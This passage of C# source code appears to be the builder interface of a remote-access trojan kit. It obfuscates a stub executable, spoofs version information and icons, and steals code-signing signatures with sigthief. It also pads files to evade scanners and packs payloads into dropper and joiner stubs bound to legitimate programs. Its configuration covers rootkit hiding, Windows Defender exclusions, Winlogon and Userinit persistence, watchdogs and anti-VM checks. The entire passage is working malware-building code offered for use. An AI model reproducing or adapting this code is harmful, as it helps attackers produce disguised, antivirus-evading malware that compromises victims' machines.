				".bat", ".cmd", ".vbs", ".js", ".ps1", ".wsf", ".wsh", ".hta", ".lnk", ".sh",
				".pl"
			};
			foreach (string ext in array)
			{
				if (text.EndsWith(ext, StringComparison.OrdinalIgnoreCase))
				{
					exd = ext;
					text = text.Substring(0, text.Length - ext.Length);
					break;
				}
			}
		}
		using (ModuleDefMD moduleDefMD = ModuleDefMD.Load(stubPath, new ModuleCreationOptions
		{
			TryToLoadPdbFromDisk = false
		}))
		{
			WriteSettings(moduleDefMD);
			if (checkBoxMixer.Checked)
			{
				Mixer.Execute(moduleDefMD);
				foreach (TypeDef type in moduleDefMD.Types)
				{
					foreach (MethodDef method in type.Methods)
					{
						if (method.Body != null)
						{
							method.Body.SimplifyBranches();
							method.Body.OptimizeBranches();
						}
					}
				}
			}
			if (checkBoxCtrlFlow.Checked)
			{
				ControlFlowObfuscation.Execute(moduleDefMD);
				foreach (TypeDef type2 in moduleDefMD.Types)
				{
					foreach (MethodDef method2 in type2.Methods)
					{
						if (method2.Body != null)
						{
							method2.Body.SimplifyBranches();
							method2.Body.OptimizeBranches();
						}
					}
				}
			}
			if (checkBoxProxyString.Checked)
			{
				ProxyString.Execute(moduleDefMD);
				foreach (TypeDef type3 in moduleDefMD.Types)
				{
					foreach (MethodDef method3 in type3.Methods)
					{
						if (method3.Body != null)
						{
							method3.Body.SimplifyBranches();
							method3.Body.OptimizeBranches();
						}
					}
				}
			}
			if (checkBox15.Checked)
			{
				ManyProxy.Execute(moduleDefMD);
				foreach (TypeDef type4 in moduleDefMD.Types)
				{
					foreach (MethodDef method4 in type4.Methods)
					{
						if (method4.Body != null)
						{
							method4.Body.SimplifyBranches();
							method4.Body.OptimizeBranches();
						}
					}
				}
			}
			if (checkBox10.Checked)
			{
				ProxyCall.Execute(moduleDefMD);
				foreach (TypeDef type5 in moduleDefMD.Types)
				{
					foreach (MethodDef method5 in type5.Methods)
					{
						if (method5.Body != null)
						{
							method5.Body.SimplifyBranches();
							method5.Body.OptimizeBranches();
						}
					}
				}
			}
			if (checkBoxJunk.Checked)
			{
				Junks.Execute(moduleDefMD);
				foreach (TypeDef type6 in moduleDefMD.Types)
				{
					foreach (MethodDef method6 in type6.Methods)
					{
						if (method6.Body != null)
						{
							method6.Body.SimplifyBranches();
							method6.Body.OptimizeBranches();
						}
					}
				}
			}
			if (checkBoxRename.Checked)
			{
				Renamer.Execute(moduleDefMD);
			}
			foreach (TypeDef type7 in moduleDefMD.Types)
			{
				foreach (MethodDef method7 in type7.Methods)
				{
					if (method7.Body != null)
					{
						method7.Body.SimplifyBranches();
						method7.Body.OptimizeBranches();
					}
				}
			}
			moduleDefMD.Write(text);
			moduleDefMD.Dispose();
		}
		if (checkBox21.Checked || checkBox2.Checked)
		{
			WriteAssembly(text);
		}
		if (checkBox20.Checked && !string.IsNullOrEmpty(pictureBox1.ImageLocation))
		{
			try
			{
				IconInjector.InjectIcon(text, pictureBox1.ImageLocation);
			}
			catch (ArgumentException ex)
			{
				MessageBox.Show("Failed to inject icon: " + ex.Message + "\n\nBuild will continue without custom icon.", "Icon Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
			}
			catch (Exception ex2)
			{
				MessageBox.Show("Failed to inject icon: " + ex2.Message + "\n\nBuild will continue without custom icon.", "Icon Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
			}
		}
		if (checkBox22.Checked)
		{
			PatchSignature(text, exd);
		}
	}

	private void rjButton5_Click(object sender, EventArgs e)
	{
		using SaveFileDialog saveFileDialog = new SaveFileDialog();
		saveFileDialog.Filter = GetFileFilter();
		saveFileDialog.InitialDirectory = Path.Combine(Application.StartupPath, "Bulids");
		saveFileDialog.OverwritePrompt = false;
		string extension = GetSelectedExtension();
		saveFileDialog.FileName = Randomizer.getRandomCharactersAscii(16) + extension;
		if (saveFileDialog.ShowDialog() != DialogResult.OK)
		{
			return;
		}
		string finalPath = saveFileDialog.FileName;
		if (!finalPath.EndsWith(extension, StringComparison.OrdinalIgnoreCase))
		{
			finalPath = Path.ChangeExtension(finalPath, extension.Substring(1));
		}
		CreateBulid(finalPath);
		if (checkBox14.Checked && !string.IsNullOrWhiteSpace(rjTextBox13.Texts) && int.TryParse(rjTextBox13.Texts, out var pumpSize) && pumpSize > 0)
		{
			string sizeUnit = rjComboBox5.Texts;
			PumpFile(finalPath, pumpSize, sizeUnit);
		}
		if (checkBox11.Checked)
		{
			string archiveType = rjComboBox4.Texts;
			string archiveName = rjTextBox10.Texts;
			string password = (checkBox12.Checked ? rjTextBox11.Texts : null);
			string buildName = (checkBox13.Checked ? rjTextBox12.Texts : null);
			string archivePath = CreateArchive(finalPath, archiveType, archiveName, password, buildName);
			if (archivePath != null)
			{
				MessageBox.Show("Build created and archived successfully!\nArchive: " + Path.GetFileName(archivePath));
				SaveBuildRecord(Path.GetFileName(archivePath), archivePath);
			}
			else
			{
				MessageBox.Show("Build created but archiving failed!");
				SaveBuildRecord(Path.GetFileName(finalPath), finalPath);
			}
		}
		else
		{
			MessageBox.Show("Build Create!");
			SaveBuildRecord(Path.GetFileName(finalPath), finalPath);
		}
	}

	private void PatchSignature(string tmp, string exd)
	{
		if (Array.IndexOf(new string[15]
		{
			".bat", ".cmd", ".vbs", ".js", ".ps1", ".wsf", ".wsh", ".hta", ".lnk", ".sh",
			".pl", ".msi", ".msc", ".app", ".gadget"
		}, exd.ToLower()) < 0)
		{
			string[] files = Directory.GetFiles("Signatures");
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.CreateNoWindow = true;
			processStartInfo.FileName = "Scripts\\sigthief.exe";
			processStartInfo.Arguments = " -s \"" + Path.Combine(Application.StartupPath, files[Randomizer.random.Next(files.Length)]) + "\" -t \"" + tmp + "\" -o \"" + tmp + exd + "\"";
			Process.Start(processStartInfo).WaitForExit();
			File.Delete(tmp);
		}
	}

	private void WriteAssembly(string filename, string filenameto)
	{
		try
		{
			FileVersionInfo versionInfo = FileVersionInfo.GetVersionInfo(filename);
			VersionResource versionResource = new VersionResource();
			versionResource.LoadFrom(filenameto);
			versionResource.FileVersion = versionInfo.FileVersion;
			versionResource.ProductVersion = versionInfo.ProductVersion;
			versionResource.Language = 0;
			StringFileInfo obj = (StringFileInfo)versionResource["StringFileInfo"];
			string procName = ((checkBox2.Checked && !string.IsNullOrWhiteSpace(rjTextBox9.Texts)) ? rjTextBox9.Texts : null);
			obj["ProductName"] = procName ?? versionInfo.ProductName ?? string.Empty;
			obj["FileDescription"] = procName ?? versionInfo.FileDescription ?? string.Empty;
			obj["CompanyName"] = versionInfo.CompanyName ?? string.Empty;
			obj["LegalCopyright"] = versionInfo.LegalCopyright ?? string.Empty;
			obj["LegalTrademarks"] = versionInfo.LegalTrademarks ?? string.Empty;
			obj["Assembly Version"] = versionResource.ProductVersion;
			obj["InternalName"] = procName ?? versionInfo.InternalName ?? string.Empty;
			obj["OriginalFilename"] = ((procName == null) ? (versionInfo.InternalName ?? string.Empty) : (procName.EndsWith(".exe", StringComparison.OrdinalIgnoreCase) ? procName : (procName + ".exe")));
			obj["ProductVersion"] = versionResource.ProductVersion;
			obj["FileVersion"] = versionResource.FileVersion;
			versionResource.SaveTo(filenameto);
		}
		catch (Exception ex)
		{
			throw new ArgumentException("Assembly: " + ex.Message);
		}
	}

	private void WriteAssembly(string filename)
	{
		try
		{
			VersionResource versionResource = new VersionResource();
			versionResource.LoadFrom(filename);
			versionResource.FileVersion = TextBoxFileVersion.Texts;
			versionResource.ProductVersion = TextBoxProductVersion.Texts;
			versionResource.Language = 0;
			StringFileInfo obj = (StringFileInfo)versionResource["StringFileInfo"];
			string procName = ((checkBox2.Checked && !string.IsNullOrWhiteSpace(rjTextBox9.Texts)) ? rjTextBox9.Texts : null);
			obj["ProductName"] = procName ?? TextBoxProduct.Texts;
			obj["FileDescription"] = procName ?? TextBoxDescription.Texts;
			obj["CompanyName"] = TextBoxCompany.Texts;
			obj["LegalCopyright"] = TextBoxCopyright.Texts;
			obj["LegalTrademarks"] = TextBoxTrademarks.Texts;
			obj["Assembly Version"] = versionResource.ProductVersion;
			obj["InternalName"] = procName ?? TextBoxOriginalFileName.Texts;
			obj["OriginalFilename"] = ((procName == null) ? TextBoxOriginalFileName.Texts : (procName.EndsWith(".exe", StringComparison.OrdinalIgnoreCase) ? procName : (procName + ".exe")));
			obj["ProductVersion"] = versionResource.ProductVersion;
			obj["FileVersion"] = versionResource.FileVersion;
			versionResource.SaveTo(filename);
		}
		catch (Exception ex)
		{
			throw new ArgumentException("Assembly: " + ex.Message);
		}
	}

	private void rjButton1_Click(object sender, EventArgs e)
	{
		if (checkBoxWMIStartup.Checked && string.IsNullOrWhiteSpace(rjTextBoxWMIStartup.Texts))
		{
			MessageBox.Show("Please enter an error message.", "Validation Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
		}
		else if (rjTextBox1.Texts.Contains(":") && !string.IsNullOrEmpty(rjTextBox1.Texts))
		{
			DataGridViewRow dataGridViewRow = new DataGridViewRow();
			dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
			{
				Value = rjTextBox1.Texts
			});
			GridIps.Rows.Add(dataGridViewRow);
			rjTextBox1.Texts = "";
		}
	}

	private void rjButton2_Click(object sender, EventArgs e)
	{
		foreach (DataGridViewRow dataGridViewRow in GridIps.SelectedRows)
		{
			GridIps.Rows.Remove(dataGridViewRow);
		}
	}

	private void rjButton4_Click(object sender, EventArgs e)
	{
		rjTextBox6.Texts = Randomizer.getRandomCharacters();
	}

	private void checkBox4_CheckedChanged(object sender, EventArgs e)
	{
		if (checkBox4.Checked)
		{
			if (!rjTextBox3.Texts.Contains("xdwd"))
			{
				rjTextBox3.Texts = "xdwd" + rjTextBox3.Texts;
			}
			if (checkBox5.Checked && !rjTextBox4.Texts.Contains("xdwd"))
			{
				rjTextBox4.Texts = "xdwd" + rjTextBox4.Texts;
			}
		}
		else
		{
			if (rjTextBox3.Texts.Contains("xdwd"))
			{
				rjTextBox3.Texts = rjTextBox3.Texts.Replace("xdwd", "");
			}
			if (checkBox5.Checked && rjTextBox4.Texts.Contains("xdwd"))
			{
				rjTextBox4.Texts = rjTextBox4.Texts.Replace("xdwd", "");
			}
		}
	}

	public void Pump(string path)
	{
		using FileStream fileStream = File.Open(path, FileMode.OpenOrCreate);
		fileStream.SetLength(fileStream.Length + new Random().Next(500, 750) * 1024 * 1024);
		fileStream.Close();
	}

	public void Pump(string path, long sizeBytes)
	{
		using FileStream fileStream = File.Open(path, FileMode.OpenOrCreate);
		fileStream.SetLength(fileStream.Length + sizeBytes);
		fileStream.Close();
	}

	private void rjButton6_Click(object sender, EventArgs e)
	{
		using FormPumpSettings formPump = new FormPumpSettings();
		formPump.ShowDialog(this);
		if (!formPump.PumpSizeBytes.HasValue)
		{
			return;
		}
		long pumpBytes = formPump.PumpSizeBytes.Value;
		using SaveFileDialog saveFileDialog = new SaveFileDialog();
		saveFileDialog.Filter = GetFileFilter();
		saveFileDialog.InitialDirectory = Path.Combine(Application.StartupPath, "Bulids");
		saveFileDialog.OverwritePrompt = false;
		string extension = GetSelectedExtension();
		saveFileDialog.FileName = Randomizer.getRandomCharactersAscii(16) + extension;
		if (saveFileDialog.ShowDialog() != DialogResult.OK)
		{
			return;
		}
		string finalPath = saveFileDialog.FileName;
		if (!finalPath.EndsWith(extension, StringComparison.OrdinalIgnoreCase))
		{
			finalPath = Path.ChangeExtension(finalPath, extension.Substring(1));
		}
		CreateBulid(finalPath);
		Pump(finalPath, pumpBytes);
		if (checkBox11.Checked)
		{
			string archiveType = rjComboBox4.Texts;
			string archiveName = rjTextBox10.Texts;
			string password = (checkBox12.Checked ? rjTextBox11.Texts : null);
			string buildName = (checkBox13.Checked ? rjTextBox12.Texts : null);
			string archivePath = CreateArchive(finalPath, archiveType, archiveName, password, buildName);
			if (archivePath != null)
			{
				MessageBox.Show("Build created and archived successfully!\nArchive: " + Path.GetFileName(archivePath));
				SaveBuildRecord(Path.GetFileName(archivePath), archivePath);
			}
			else
			{
				MessageBox.Show("Build created but archiving failed!");
				SaveBuildRecord(Path.GetFileName(finalPath), finalPath);
			}
		}
		else
		{
			MessageBox.Show("Build Create!");
			SaveBuildRecord(Path.GetFileName(finalPath), finalPath);
		}
	}

	private void rjButton7_Click(object sender, EventArgs e)
	{
		using OpenFileDialog openFileDialog = new OpenFileDialog();
		openFileDialog.Title = "Choose program";
		openFileDialog.Filter = "Files(*.exe)|*.exe";
		openFileDialog.Multiselect = false;
		if (openFileDialog.ShowDialog() != DialogResult.OK)
		{
			return;
		}
		using SaveFileDialog saveFileDialog = new SaveFileDialog();
		saveFileDialog.Filter = GetFileFilter();
		saveFileDialog.InitialDirectory = Path.Combine(Application.StartupPath, "Bulids");
		saveFileDialog.OverwritePrompt = false;
		string extension = GetSelectedExtension();
		saveFileDialog.FileName = Randomizer.getRandomCharactersAscii(16) + extension;
		if (saveFileDialog.ShowDialog() != DialogResult.OK)
		{
			return;
		}
		string finalPath = saveFileDialog.FileName;
		if (!finalPath.EndsWith(extension, StringComparison.OrdinalIgnoreCase))
		{
			finalPath = Path.ChangeExtension(finalPath, extension.Substring(1));
		}
		CreateBulid(finalPath);
		BulidJoin(openFileDialog.FileName, finalPath);
		string joinerPath = Path.Combine(Path.GetDirectoryName(finalPath), Path.GetFileName(openFileDialog.FileName));
		if (File.Exists(joinerPath) && joinerPath != finalPath)
		{
			if (File.Exists(finalPath))
			{
				File.Delete(finalPath);
			}
			File.Move(joinerPath, finalPath);
		}
		MessageBox.Show("Build Create!");
		SaveBuildRecord(Path.GetFileName(finalPath), finalPath);
	}

	public void BulidDropper(string bulid)
	{
		string text = bulid;
		string exd = "";
		if (checkBox22.Checked)
		{
			string[] array = new string[21]
			{
				".exe", ".scr", ".com", ".pif", ".sys", ".cpl", ".msi", ".msc", ".app", ".gadget",
				".bat", ".cmd", ".vbs", ".js", ".ps1", ".wsf", ".wsh", ".hta", ".lnk", ".sh",
				".pl"
			};
			foreach (string ext in array)
			{
				if (text.EndsWith(ext, StringComparison.OrdinalIgnoreCase))
				{
					exd = ext;
					text = text.Substring(0, text.Length - ext.Length);
					break;
				}
			}
		}
		using (ModuleDefMD moduleDefMD = ModuleDefMD.Load("Stub\\Dropper.exe", new ModuleCreationOptions
		{
			TryToLoadPdbFromDisk = false
		}))
		{
			string randomCharacters = Randomizer.getRandomCharacters();
			using (MemoryStream memoryStream = new MemoryStream())
			{
				BitmapCoding.ByteToBitmap(File.ReadAllBytes(bulid)).Save(memoryStream, ImageFormat.Png);
				moduleDefMD.Resources.Add(new EmbeddedResource(randomCharacters, memoryStream.ToArray()));
			}
			EncryptString encryptString = new EncryptString();
			string str = " !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~";
			encryptString.dec = Randomizer.Shuffle(str);
			encryptString.enc = Randomizer.Shuffle(encryptString.dec);
			foreach (TypeDef typeDef in moduleDefMD.Types)
			{
				foreach (MethodDef methodDef in typeDef.Methods)
				{
					if (methodDef.Body == null || methodDef.Body.Instructions == null || methodDef.Name == "WinExec")
					{
						continue;
					}
					for (int j = 0; j < methodDef.Body.Instructions.Count; j++)
					{
						if (methodDef.Body.Instructions[j].OpCode != OpCodes.Ldstr)
						{
							continue;
						}
						switch (methodDef.Body.Instructions[j].Operand.ToString())
						{
						case "%antivirtual%":
							methodDef.Body.Instructions[j].Operand = encryptString.Encrypt(true.ToString().ToLower());
							continue;
						case "%runas%":
							methodDef.Body.Instructions[j].Operand = encryptString.Encrypt(true.ToString().ToLower());
							continue;
						case "%name%":
							methodDef.Body.Instructions[j].Operand = encryptString.Encrypt(randomCharacters);
							continue;
						case "%dec%":
							methodDef.Body.Instructions[j].Operand = encryptString.dec;
							continue;
						case "%enc%":
							methodDef.Body.Instructions[j].Operand = encryptString.enc;
							continue;
						}
						if (!typeDef.Name.Contains("Caesars"))
						{
							methodDef.Body.Instructions[j].Operand = encryptString.Encrypt((string)methodDef.Body.Instructions[j].Operand);
						}
					}
				}
			}
			if (checkBoxMixer.Checked)
			{
				Mixer.Execute(moduleDefMD);
			}
			if (checkBoxRename.Checked)
			{
				Renamer.Execute(moduleDefMD);
			}
			if (checkBoxCtrlFlow.Checked)
			{
				ControlFlowObfuscation.Execute(moduleDefMD);
			}
			ManyProxy.Execute(moduleDefMD);
			ProxyCall.Execute(moduleDefMD);
			if (checkBoxProxyString.Checked)
			{
				ProxyString.Execute(moduleDefMD);
			}
			if (checkBoxProtectInt.Checked)
			{
				Int.Execute(moduleDefMD);
			}
			if (checkBoxProxyInt.Checked)
			{
				ProxyInt.Execute(moduleDefMD);
			}
			if (checkBoxJunk.Checked)
			{
				Junks.Execute(moduleDefMD);
			}
			foreach (TypeDef type in moduleDefMD.Types)
			{
				foreach (MethodDef method in type.Methods)
				{
					if (method.Body != null)
					{
						method.Body.SimplifyBranches();
						method.Body.OptimizeBranches();
					}
				}
			}
			moduleDefMD.Write(text);
			moduleDefMD.Dispose();
		}
		WriteAssembly(bulid, text);
		try
		{
			string iconPath = Methods.GetIcon(bulid);
			if (!string.IsNullOrEmpty(iconPath) && File.Exists(iconPath))
			{
				IconInjector.InjectIcon(text, iconPath);
			}
		}
		catch (ArgumentException)
		{
		}
		catch (Exception)
		{
		}
		if (checkBox22.Checked)
		{
			PatchSignature(text, exd);
		}
	}

	public void BulidJoin(string original, string bulid)
	{
		string text = Path.Combine(Path.GetDirectoryName(bulid), Path.GetFileName(original));
		string exd = "";
		if (checkBox22.Checked)
		{
			string[] array = new string[21]
			{
				".exe", ".scr", ".com", ".pif", ".sys", ".cpl", ".msi", ".msc", ".app", ".gadget",
				".bat", ".cmd", ".vbs", ".js", ".ps1", ".wsf", ".wsh", ".hta", ".lnk", ".sh",
				".pl"
			};
			foreach (string ext in array)
			{
				if (text.EndsWith(ext, StringComparison.OrdinalIgnoreCase))
				{
					exd = ext;
					text = text.Substring(0, text.Length - ext.Length);
					break;
				}
			}
		}
		using (ModuleDefMD moduleDefMD = ModuleDefMD.Load("Stub\\Joiner.exe", new ModuleCreationOptions
		{
			TryToLoadPdbFromDisk = false
		}))
		{
			string text2 = Randomizer.LegalNaming[0] + ".dll";
			string text3 = Randomizer.LegalNaming[1] + ".dll";
			using (MemoryStream memoryStream1 = new MemoryStream())
			{
				BitmapCoding.ByteToBitmap(File.ReadAllBytes(original)).Save(memoryStream1, ImageFormat.Png);
				moduleDefMD.Resources.Add(new EmbeddedResource(text2, memoryStream1.ToArray()));
			}
			using (MemoryStream memoryStream2 = new MemoryStream())
			{
				BitmapCoding.ByteToBitmap(File.ReadAllBytes(bulid)).Save(memoryStream2, ImageFormat.Png);
				moduleDefMD.Resources.Add(new EmbeddedResource(text3, memoryStream2.ToArray()));
			}
			EncryptString encryptString = new EncryptString();
			string str = " !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~";
			encryptString.dec = Randomizer.Shuffle(str);
			encryptString.enc = Randomizer.Shuffle(encryptString.dec);
			foreach (TypeDef typeDef in moduleDefMD.Types)
			{
				foreach (MethodDef methodDef in typeDef.Methods)
				{
					if (methodDef.Body == null || methodDef.Body.Instructions == null)
					{
						continue;
					}
					for (int j = 0; j < methodDef.Body.Instructions.Count; j++)
					{
						if (methodDef.Body.Instructions[j].OpCode != OpCodes.Ldstr)
						{
							continue;
						}
						switch (methodDef.Body.Instructions[j].Operand.ToString())
						{
						case "%antivirtual%":
							methodDef.Body.Instructions[j].Operand = encryptString.Encrypt(true.ToString().ToLower());
							continue;
						case "%runas%":
							methodDef.Body.Instructions[j].Operand = encryptString.Encrypt(true.ToString().ToLower());
							continue;
						case "%names%":
							methodDef.Body.Instructions[j].Operand = encryptString.Encrypt(text2 + "," + text3);
							continue;
						case "%dec%":
							methodDef.Body.Instructions[j].Operand = encryptString.dec;
							continue;
						case "%enc%":
							methodDef.Body.Instructions[j].Operand = encryptString.enc;
							continue;
						}
						if (!typeDef.Name.Contains("Caesars"))
						{
							methodDef.Body.Instructions[j].Operand = encryptString.Encrypt((string)methodDef.Body.Instructions[j].Operand);
						}
					}
				}
			}
			if (checkBoxMixer.Checked)
			{
				Mixer.Execute(moduleDefMD);
			}
			if (checkBoxRename.Checked)
			{
				Renamer.Execute(moduleDefMD);
			}
			if (checkBoxCtrlFlow.Checked)
			{
				ControlFlowObfuscation.Execute(moduleDefMD);
			}
			ManyProxy.Execute(moduleDefMD);
			ProxyCall.Execute(moduleDefMD);
			if (checkBoxProxyString.Checked)
			{
				ProxyString.Execute(moduleDefMD);
			}
			if (checkBoxProtectInt.Checked)
			{
				Int.Execute(moduleDefMD);
			}
			if (checkBoxProxyInt.Checked)
			{
				ProxyInt.Execute(moduleDefMD);
			}
			if (checkBoxJunk.Checked)
			{
				Junks.Execute(moduleDefMD);
			}
			foreach (TypeDef type in moduleDefMD.Types)
			{
				foreach (MethodDef method in type.Methods)
				{
					if (method.Body != null)
					{
						method.Body.SimplifyBranches();
						method.Body.OptimizeBranches();
					}
				}
			}
			moduleDefMD.Write(text);
			moduleDefMD.Dispose();
		}
		try
		{
			WriteAssembly(original, text);
		}
		catch
		{
		}
		try
		{
			string iconPath = Methods.GetIcon(original);
			if (!string.IsNullOrEmpty(iconPath) && File.Exists(iconPath))
			{
				IconInjector.InjectIcon(text, iconPath);
			}
		}
		catch (ArgumentException)
		{
		}
		catch (Exception)
		{
		}
		if (checkBox22.Checked)
		{
			PatchSignature(text, exd);
		}
	}

	private void rjButton8_Click(object sender, EventArgs e)
	{
		using SaveFileDialog saveFileDialog = new SaveFileDialog();
		saveFileDialog.Filter = GetFileFilter();
		saveFileDialog.InitialDirectory = Path.Combine(Application.StartupPath, "Bulids");
		saveFileDialog.OverwritePrompt = false;
		string extension = GetSelectedExtension();
		saveFileDialog.FileName = Randomizer.getRandomCharactersAscii(16) + extension;
		if (saveFileDialog.ShowDialog() != DialogResult.OK)
		{
			return;
		}
		string finalPath = saveFileDialog.FileName;
		if (!finalPath.EndsWith(extension, StringComparison.OrdinalIgnoreCase))
		{
			finalPath = Path.ChangeExtension(finalPath, extension.Substring(1));
		}
		CreateBulid(finalPath);
		BulidDropper(finalPath);
		Thread.Sleep(500);
		if (!File.Exists(finalPath))
		{
			MessageBox.Show("Build file was not created successfully!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			return;
		}
		if (checkBox11.Checked && checkBox14.Checked && !string.IsNullOrWhiteSpace(rjTextBox13.Texts) && int.TryParse(rjTextBox13.Texts, out var pumpSize) && pumpSize > 0)
		{
			string sizeUnit = rjComboBox5.Texts;
			PumpFile(finalPath, pumpSize, sizeUnit);
		}
		if (checkBox11.Checked)
		{
			string archiveType = rjComboBox4.Texts;
			string archiveName = rjTextBox10.Texts;
			string password = (checkBox12.Checked ? rjTextBox11.Texts : null);
			string buildName = (checkBox13.Checked ? rjTextBox12.Texts : null);
			string archivePath = CreateArchive(finalPath, archiveType, archiveName, password, buildName);
			if (archivePath != null)
			{
				MessageBox.Show("Build created and archived successfully!\nArchive: " + Path.GetFileName(archivePath));
				return;
			}
			MessageBox.Show("Build created but archiving failed!");
			SaveBuildRecord(Path.GetFileName(finalPath), finalPath);
		}
		else
		{
			MessageBox.Show("Build Create!");
			SaveBuildRecord(Path.GetFileName(finalPath), finalPath);
		}
	}

	private void rjButton9_Click(object sender, EventArgs e)
	{
		using OpenFileDialog openFileDialog = new OpenFileDialog();
		openFileDialog.Title = "Choose program";
		openFileDialog.Filter = "Files(*.exe)|*.exe";
		openFileDialog.Multiselect = false;
		if (openFileDialog.ShowDialog() != DialogResult.OK)
		{
			return;
		}
		using SaveFileDialog saveFileDialog = new SaveFileDialog();
		saveFileDialog.Filter = GetFileFilter();
		saveFileDialog.InitialDirectory = Path.Combine(Application.StartupPath, "Bulids");
		saveFileDialog.OverwritePrompt = false;
		string extension = GetSelectedExtension();
		saveFileDialog.FileName = Randomizer.getRandomCharactersAscii(16) + extension;
		if (saveFileDialog.ShowDialog() != DialogResult.OK)
		{
			return;
		}
		string finalPath = saveFileDialog.FileName;
		if (!finalPath.EndsWith(extension, StringComparison.OrdinalIgnoreCase))
		{
			finalPath = Path.ChangeExtension(finalPath, extension.Substring(1));
		}
		CreateBulid(finalPath);
		BulidDropper(finalPath);
		BulidJoin(openFileDialog.FileName, finalPath);
		string joinerPath = Path.Combine(Path.GetDirectoryName(finalPath), Path.GetFileName(openFileDialog.FileName));
		if (File.Exists(joinerPath) && joinerPath != finalPath)
		{
			if (File.Exists(finalPath))
			{
				File.Delete(finalPath);
			}
			File.Move(joinerPath, finalPath);
		}
		MessageBox.Show("Build Create!");
		SaveBuildRecord(Path.GetFileName(finalPath), finalPath);
	}

	private void rjButton10_Click(object sender, EventArgs e)
	{
		using FormPumpSettings formPump = new FormPumpSettings();
		formPump.ShowDialog(this);
		if (!formPump.PumpSizeBytes.HasValue)
		{
			return;
		}
		long pumpBytes = formPump.PumpSizeBytes.Value;
		using SaveFileDialog saveFileDialog = new SaveFileDialog();
		saveFileDialog.Filter = GetFileFilter();
		saveFileDialog.InitialDirectory = Path.Combine(Application.StartupPath, "Bulids");
		saveFileDialog.OverwritePrompt = false;
		string extension = GetSelectedExtension();
		saveFileDialog.FileName = Randomizer.getRandomCharactersAscii(16) + extension;
		if (saveFileDialog.ShowDialog() != DialogResult.OK)
		{
			return;
		}
		string finalPath = saveFileDialog.FileName;
		if (!finalPath.EndsWith(extension, StringComparison.OrdinalIgnoreCase))
		{
			finalPath = Path.ChangeExtension(finalPath, extension.Substring(1));
		}
		CreateBulid(finalPath);
		BulidDropper(finalPath);
		Pump(finalPath, pumpBytes);
		if (checkBox11.Checked)
		{
			string archiveType = rjComboBox4.Texts;
			string archiveName = rjTextBox10.Texts;
			string password = (checkBox12.Checked ? rjTextBox11.Texts : null);
			string buildName = (checkBox13.Checked ? rjTextBox12.Texts : null);
			string archivePath = CreateArchive(finalPath, archiveType, archiveName, password, buildName);
			if (archivePath != null)
			{
				MessageBox.Show("Build created and archived successfully!\nArchive: " + Path.GetFileName(archivePath));
				SaveBuildRecord(Path.GetFileName(archivePath), archivePath);
			}
			else
			{
				MessageBox.Show("Build created but archiving failed!");
				SaveBuildRecord(Path.GetFileName(finalPath), finalPath);
			}
		}
		else
		{
			MessageBox.Show("Build Create!");
			SaveBuildRecord(Path.GetFileName(finalPath), finalPath);
		}
	}

	private void rjButton12_Click(object sender, EventArgs e)
	{
		using OpenFileDialog openFileDialog = new OpenFileDialog();
		openFileDialog.Filter = ".json (*.json)|*.json";
		openFileDialog.InitialDirectory = Path.Combine(Application.StartupPath, "Bulids");
		if (openFileDialog.ShowDialog() == DialogResult.OK)
		{
			BulidData bulidData = JsonConvert.DeserializeObject<BulidData>(File.ReadAllText(openFileDialog.FileName));
			checkBox20.Checked = bulidData.CheckIcon;
			checkBox21.Checked = bulidData.CheckAssembly;
			checkBox22.Checked = bulidData.DigitalSignature;
			if (bulidData.CheckIcon)
			{
				File.WriteAllBytes("local\\temp.ico", bulidData.Icon);
				pictureBox1.ImageLocation = "local\\temp.ico";
			}
			GridIps.Rows.Clear();
			string[] hosts = bulidData.Hosts;
			foreach (string value in hosts)
			{
				DataGridViewRow dataGridViewRow = new DataGridViewRow();
				dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
				{
					Value = value
				});
				GridIps.Rows.Add(dataGridViewRow);
			}
			TextBoxProduct.Texts = bulidData.Product;
			TextBoxDescription.Texts = bulidData.Description;
			TextBoxCompany.Texts = bulidData.Company;
			TextBoxCopyright.Texts = bulidData.Copyright;
			TextBoxTrademarks.Texts = bulidData.Trademarks;
			TextBoxOriginalFileName.Texts = bulidData.OriginalFilename;
			TextBoxProductVersion.Texts = bulidData.ProductVersion;
			TextBoxFileVersion.Texts = bulidData.FileVersion;
			checkBox1.Checked = bulidData.Install;
			checkBox2.Checked = bulidData.ProcessName;
			rjTextBox9.Texts = bulidData.ProcessNameValue ?? "";
			checkBoxWinlogonShell.Checked = bulidData.WinlogonShell;
			checkBox8.Checked = bulidData.ExclusionWD;
			checkBox6.Checked = bulidData.HiddenFile;
			checkBox4.Checked = bulidData.RootKit;
			checkBox9.Checked = bulidData.Pump;
			checkBox7.Checked = bulidData.UserInit;
			checkBox5.Checked = bulidData.InstallWatchDog;
			checkBoxProcessCritical.Checked = bulidData.ProcessCritical;
			rjTextBoxProcessCritical.Texts = bulidData.ProcessCriticalName ?? "";
			checkBoxProcessCritical_CheckedChanged(null, EventArgs.Empty);
			checkBoxWinlogonShell.Checked = bulidData.WinlogonShell;
			checkBox2.Checked = bulidData.ProcessName;
			rjTextBox9.Texts = bulidData.ProcessNameValue ?? "";
			checkBoxWMIStartup.Checked = bulidData.InstallServices;
			rjTextBoxWMIStartup.Texts = bulidData.InstallServicesValue ?? "";
			checkBoxWMIStartup_CheckedChanged(null, EventArgs.Empty);
			rjTextBox2.Texts = bulidData.TaskClient;
			rjTextBox5.Texts = bulidData.TaskWatchDog;
			rjComboBox1.Texts = bulidData.PathClientCmb;
			rjTextBox3.Texts = bulidData.PathClientBox;
			rjComboBox2.Texts = bulidData.PathWatchDogCmb;
			rjTextBox4.Texts = bulidData.PathWatchDogBox;
			rjTextBox7.Texts = bulidData.Group;
			rjTextBox6.Texts = bulidData.Mutex;
			checkBoxCmdlineAutorun.Checked = bulidData.CmdlineAutorun;
			rjComboBoxCmdlineDir.Texts = bulidData.CmdlineDir ?? "%Windows%";
